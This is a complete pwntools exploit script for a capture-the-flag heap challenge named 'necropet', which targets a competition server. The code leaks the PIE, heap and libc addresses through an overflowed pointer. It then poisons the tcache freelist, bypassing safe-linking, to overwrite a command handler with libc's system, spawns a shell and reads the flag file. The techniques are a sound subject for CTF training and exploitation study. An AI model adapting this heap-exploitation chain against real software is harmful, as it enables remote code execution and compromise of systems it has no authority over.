#!/usr/bin/env python3

from pathlib import Path
from pwn import *

BASE_DIR = Path(__file__).resolve().parent
BINARY_PATH = BASE_DIR / "necropet"
LOADER_PATH = BASE_DIR / "ld-linux-x86-64.so.2"
LIBC_PATH = BASE_DIR / "libc.so.6"

context.binary = elf = ELF(str(BINARY_PATH), checksec=False)
libc = ELF(str(LIBC_PATH), checksec=False)
context.log_level = "info"


def start():
    if args.REMOTE:
        return remote(args.HOST or "chal.thjcc.org", int(args.PORT or 1024))
    if args.GDB:
        return gdb.debug(
            [str(LOADER_PATH), "--library-path", str(BASE_DIR), str(BINARY_PATH)],
            gdbscript="set pagination off\ncontinue",
        )
    return process([str(LOADER_PATH), "--library-path", str(BASE_DIR), str(BINARY_PATH)])


def cmd(io, line):
    io.sendline(line)


def admit(io, slot, cap=0x20, kind=0):
    cmd(io, f"admit {slot} {kind} {cap} 0".encode())
    io.recvuntil(b"admitted\n", timeout=3)


def select(io, slot):
    cmd(io, f"select {slot}".encode())
    io.recvuntil(b"selected\n", timeout=3)


def revise(io, data):
    cmd(io, f"revise {len(data)}".encode())
    io.send(data)
    io.recvuntil(b"revised\n", timeout=3)


def visit(io):
    cmd(io, b"visit")
    return io.recvuntil(b"\n", timeout=3)


def show(io):
    cmd(io, b"show")
    line = io.recvuntil(b"\n", timeout=3)
    if not line.startswith(b"record: "):
        raise RuntimeError(f"unexpected show output: {line!r}")
    return bytes.fromhex(line[8:].decode().strip())


def raw_leak(io, target):
    revise(io, b"A" * 0x18 + p64(target))
    out = visit(io)
    marker = b" the "
    if marker not in out:
        raise RuntimeError(f"unexpected visit output: {out!r}")
    leaked = out.split(marker, 1)[1]
    return leaked.split(b" keeps very still.", 1)[0]


def exploit(io):
    admit(io, 0)
    admit(io, 1)
    select(io, 0)

    record = show(io)
    species = u64(record[0x18:0x20])
    pie = None
    for needle in (b"cat\0", b"dog\0", b"rabbit\0", b"marten\0", b"crow\0", b"guinea pig\0"):
        off = next(elf.search(needle), None)
        if off is not None and species >= off:
            candidate = species - off
            if candidate & 0xfff == 0:
                pie = candidate
                break
    if pie is None:
        raise RuntimeError(f"could not derive PIE from species pointer {species:#x}")
    log.success(f"PIE base: {pie:#x}")

    heap_bytes = raw_leak(io, pie + elf.symbols["kennels"])
    if len(heap_bytes) < 6:
        raise RuntimeError(f"short heap leak: {heap_bytes!r}")
    chunk = u64(heap_bytes.ljust(8, b"\0"))
    log.success(f"heap chunk: {chunk:#x}")

    libc_bytes = b""
    for symbol in ("puts", "malloc", "free", "fgets", "fread", "printf", "__printf_chk"):
        if symbol not in elf.got:
            continue
        candidate = raw_leak(io, pie + elf.got[symbol])
        if len(candidate) > len(libc_bytes):
            libc_bytes = candidate
        if len(candidate) >= 6:
            break
    if len(libc_bytes) < 6:
        raise RuntimeError(f"short libc leak: {libc_bytes!r}")
    puts = u64(libc_bytes.ljust(8, b"\0"))
    libc.address = puts - libc.sym["puts"]
    log.success(f"libc base: {libc.address:#x}")

    select(io, 1)
    cmd(io, b"release 1")
    io.recvuntil(b"released\n", timeout=3)
    select(io, 0)
    cmd(io, b"release 0")
    io.recvuntil(b"released\n", timeout=3)

    target = pie + 0x50b0
    encoded = target ^ (chunk >> 12)
    revise(io, p64(encoded) + b"B" * (0x48 - 8))
    admit(io, 0)
    admit(io, 1)
    select(io, 1)
    revise(io, b"cook\0" + b"A" * 0xb + p64(libc.sym["system"]))
    debug = show(io)
    log.info(f"handler bytes: {debug[0x10:0x18].hex()} expected {p64(libc.sym['system']).hex()}")

    cmd(io, b"cook sh")
    io.sendline(b"cat ./thisisratratratrat_puipui.txt")
    data = io.recvrepeat(1)
    log.info(f"command output: {data!r}")
    if b"THJCC{" not in data:
        raise RuntimeError("system handler did not execute shell command")


def main():
    io = start()
    exploit(io)
    io.interactive()


if __name__ == "__main__":
    main()
